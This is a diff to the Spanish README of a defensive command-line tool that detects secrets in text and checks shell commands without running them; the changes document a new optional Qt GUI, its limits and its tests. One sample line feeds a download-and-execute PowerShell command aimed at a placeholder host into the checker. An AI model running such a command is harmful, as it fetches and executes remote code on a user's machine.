@@ -5,8 +5,8 @@ contraseña, tokens Bearer y credenciales en URLs PostgreSQL en texto
 proporcionado explícitamente por stdin, y revisar comandos Bash o PowerShell
 sin ejecutarlos. En Fedora/Wayland permite sanitizar el portapapeles mediante
 una orden explícita.
-Requiere Python 3.11 o superior y usa
-solo la biblioteca estándar durante la ejecución.
+Requiere Python 3.11 o superior. La CLI y el núcleo usan solo la biblioteca
+estándar durante la ejecución; la GUI tiene una dependencia opcional de Qt.
 
 ## Uso
 
@@ -38,6 +38,79 @@ printf '%s\n' 'iwr https://example.invalid/synthetic.ps1 | iex' | sentinel check
 resto del texto y reutiliza una etiqueta para cada valor repetido de la misma categoría durante
 la operación. Se admiten hasta 1 MiB de entrada UTF-8; errores y diagnósticos
 van a stderr sin reproducir la entrada.
+
+## GUI opcional
+
+En un entorno virtual, instala `pip install '.[gui]'` y ejecuta `sentinel-gui`.
+`pip install .` conserva la CLI sin instalar Qt. El lanzador importa Qt solo
+cuando se invoca la GUI y comunica de forma segura si falta el extra.
+La versión mínima de PySide6 es 6.12.0, comprobada con Python 3.14.7.
+
+La ventana tiene entrada de texto plano y salida de solo lectura. **Inspeccionar**
+muestra metadatos de los hallazgos; **Sanitizar** muestra el texto completo
+resultante; **Analizar comando** usa el selector Bash/PowerShell (Bash por
+defecto). El selector solo afecta al análisis de comandos. Inspección y análisis
+presentan como máximo los primeros 200 hallazgos, indicando total y cantidad
+mostrada, sin fragmentos originales. La salida sanitizada no se recorta aunque
+los placeholders hagan que supere 1 MiB. Cambiar la entrada elimina la salida
+anterior y descarta resultados y errores de operaciones sobre una revisión vieja.
+
+Tab recorre Inspeccionar → Sanitizar → Analizar comando → selector de lenguaje
+→ Limpiar → Entrada → Salida → inicio; Shift+Tab recorre el orden inverso.
+Ambos editores permiten entrar y salir con esas teclas. La salida conserva
+la selección y copia manual y permanece de solo lectura. Espacio activa el
+botón que tiene el foco. Durante una operación se omiten los controles deshabilitados.
+
+La entrada aceptada se limita a 1 MiB de bytes UTF-8, no caracteres; se rechazan
+ediciones o pegados que excedan el presupuesto, sin truncarlos. Se comprueba de
+nuevo antes y dentro del trabajador. Qt puede asignar memoria al recibir un
+pegado antes de esta comprobación; el límite no acota toda su memoria interna.
+El editor de Qt normaliza los finales de línea: el motor conserva el texto
+que contiene el editor, no los bytes originales de un archivo externo.
+
+Solo se ejecuta una operación simultánea en un QThread. La entrada sigue siendo
+editable; los botones de análisis y el selector se deshabilitan durante el
+trabajo. Al cerrar, la ventana espera de forma asíncrona a la finalización y
+a la terminación nativa del hilo, sin espera bloqueante ni terminación forzada.
+No hay cancelación inmediata ni plazo duro del análisis; un hilo no elimina las
+limitaciones del GIL. La presentación de resultados grandes también tiene coste.
+
+La aplicación no consulta ni modifica automáticamente el portapapeles. El
+pegado y copiado manual funcionan mediante el editor; no hay integración con
+wl-clipboard en esta ventana. No hay archivos de contenido, autosave, historial
+propio, bandeja ni monitorización. Deshacer está desactivado. **Limpiar** descarta
+la entrada y la salida; no garantiza borrado seguro de RAM ni elimina historial
+de otros gestores. Los errores son mensajes estáticos y no muestran excepciones,
+entrada ni salida. Un resultado sin hallazgos no garantiza seguridad.
+
+PySide6 es el binding oficial de Qt para Python. Se usan QtCore, QtGui y
+QtWidgets, sin QML ni WebEngine en la aplicación. El extra PySide6 instala
+binarios y módulos adicionales, lo que aumenta descarga, disco y mantenimiento;
+las actualizaciones requieren repetir pruebas de GUI y compatibilidad con Python.
+Está disponible bajo LGPLv3/GPLv3 o licencia comercial; al distribuir deben
+respetarse las licencias aplicables y los avisos de terceros:
+[Qt for Python](https://doc.qt.io/qtforpython-6/index.html) y
+[licencias](https://doc.qt.io/qtforpython-6/licenses.html).
+
+### Comprobación de la GUI
+
+Con el extra instalado, ejecuta:
+
+```sh
+.venv/bin/python -m unittest tests.test_gui tests.test_gui_launcher -v
+.venv/bin/python -m unittest discover -s tests -v
+python3 -m compileall -q src tests
+git diff --check
+```
+
+Las pruebas GUI usan QtTest con la plataforma virtual `offscreen`, datos
+sintéticos y QMimeData simulado. La copia manual se comprueba solo con el
+portapapeles virtual de ese plugin, sin acceder al portapapeles real. Sin el extra,
+las pruebas que necesitan Qt se omiten; deben ejecutarse sin omisiones en el
+entorno GUI. Esto **no sustituye una revisión visual nativa en Fedora/Wayland**,
+todavía pendiente: temas claro/oscuro, escalado HiDPI, tamaños de ventana,
+navegación por teclado, legibilidad, operaciones cerca del límite y cierre con
+trabajo pendiente. Para esa revisión se utilizarán solo datos sintéticos.
 
 ## Portapapeles en Fedora/Wayland
 
@@ -165,6 +238,6 @@ seguridad.
 La detección es textual: no interpreta lenguajes de configuración, comentarios
 ni valores multilínea, y solo cubre las claves y formas descritas.
 No se hacen conexiones de red ni se ejecuta el texto de entrada. La ausencia
-de hallazgos no garantiza que el texto sea seguro. La GUI está pendiente.
+de hallazgos no garantiza que el texto sea seguro.
 
 Los ejemplos y las pruebas usan exclusivamente datos sintéticos.
